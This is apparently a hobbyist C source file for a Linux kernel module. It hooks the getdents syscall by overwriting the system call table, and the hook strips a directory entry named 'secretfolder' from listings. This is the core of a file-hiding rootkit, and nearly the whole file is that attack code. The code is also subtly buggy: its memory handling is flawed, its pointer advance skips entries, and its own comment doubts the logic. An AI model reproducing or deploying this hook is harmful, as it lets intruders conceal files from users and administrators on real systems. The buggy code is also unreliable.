#include "getdents.h"
unsigned long **SYS_CALL_TABLE;

struct linux_dirent {
	unsigned long	  d_ino;    /* Inode number */
	unsigned long	  d_off;	  /* Offset to next linux_dirent */
	unsigned short	d_reclen; // d_reclen is the way to tell the length of this entry
	char		      d_name[];   // the struct value is actually longer than this, and d_name is variable width.
}*dirp2 , *dirp3 , *retn;   // // dirp = directory pointer

char hide[]="secretfolder";

asmlinkage int ( *original_getdents ) (unsigned int fd, struct linux_dirent *dirp, unsigned int count); 

//Create Our version of Open Function.  
asmlinkage int	HookGetDents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);


//Create Our version of Open Function.  
asmlinkage int HookGetDents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){

  struct linux_dirent *retn, *dirp3; 
  int Records, RemainingBytes, length;

  Records = (*original_getdents) (fd, dirp, count);

  if (Records <= 0){
    return Records;
  }

  retn = (struct linux_dirent *) kmalloc(Records, GFP_KERNEL);
  //Copy struct from userspace to our memspace in kernel space
  copy_from_user(retn, dirp, Records);

  dirp3 = retn;
  RemainingBytes = Records;
  

  while(RemainingBytes > 0){
    length = dirp3->d_reclen;
    RemainingBytes -= dirp3->d_reclen;
  
    printk(KERN_INFO "RemainingBytes %d   \t File: %s " ,  RemainingBytes , dirp3->d_name );

    if(strcmp( (dirp3->d_name) , hide ) == 0){
      memcpy(dirp3, (char*)dirp3+dirp3->d_reclen, RemainingBytes);
      Records -= length; //  dirp3->d_reclen; // leads to mistake?
    }
    dirp3 = (struct linux_dirent *) ((char *)dirp3 + dirp3->d_reclen);

  }
  // Copy the record back to the origional struct
  copy_to_user(dirp, retn, Records);
  kfree(retn);
  return Records;
}


// Set up hooks.
extern int SetHooks(void) {
	// Gets Syscall Table **
 	SYS_CALL_TABLE = (unsigned long**)kallsyms_lookup_name("sys_call_table"); 

	printk(KERN_INFO "Hooks Will Be Set.\n");
	printk(KERN_INFO "System call table at %p\n", SYS_CALL_TABLE);
	original_getdents = (void*)SYS_CALL_TABLE[__NR_getdents];
	SYS_CALL_TABLE[__NR_getdents] = (unsigned long*)HookGetDents;

	return 0;
}

extern void HookCleanup(void) {
	SYS_CALL_TABLE[__NR_getdents] = (unsigned long*)original_getdents;
	printk(KERN_INFO "HooksCleaned Up!");
}
